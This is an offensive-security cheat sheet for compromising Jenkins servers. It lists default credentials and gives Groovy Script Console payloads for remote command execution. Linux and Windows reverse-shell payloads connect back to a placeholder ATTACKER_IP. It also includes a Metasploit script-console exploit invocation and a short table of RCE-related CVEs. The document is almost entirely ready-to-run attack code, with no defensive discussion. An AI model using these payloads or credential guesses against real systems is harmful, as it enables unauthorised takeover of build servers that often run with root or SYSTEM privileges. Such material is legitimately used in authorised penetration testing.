# Jenkins

## Discovery

- Default port: 8080
- Also uses port 5000 for slave servers
- Runs on Tomcat
- Often runs as SYSTEM (Windows) or root (Linux)

## Default Credentials

```
admin:admin
admin:password
jenkins:jenkins
```

---

## Script Console RCE (Authenticated)

Path: `Manage Jenkins → Script Console` or `/script`

### Linux Reverse Shell (Groovy)

```groovy
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/ATTACKER_IP/PORT;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
```

### Linux - Alternative

```groovy
def cmd = 'id'
def sout = new StringBuffer(), serr = new StringBuffer()
def proc = cmd.execute()
proc.consumeProcessOutput(sout, serr)
proc.waitForOrKill(1000)
println sout
```

### Windows Command Execution

```groovy
def cmd = "cmd.exe /c whoami".execute();
println("${cmd.text}");
```

### Windows Reverse Shell (Groovy)

```groovy
String host="ATTACKER_IP";
int port=443;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```

---

## Metasploit

```bash
# Script console RCE
use exploit/multi/http/jenkins_script_console
set RHOSTS TARGET
set USERNAME admin
set PASSWORD admin
set TARGETURI /
run
```

---

## CVEs

| CVE | Description |
|-----|-------------|
| CVE-2018-1999002 + CVE-2019-1003000 | Pre-auth RCE (v2.137) |
| CVE-2019-1003000 | Sandbox bypass |
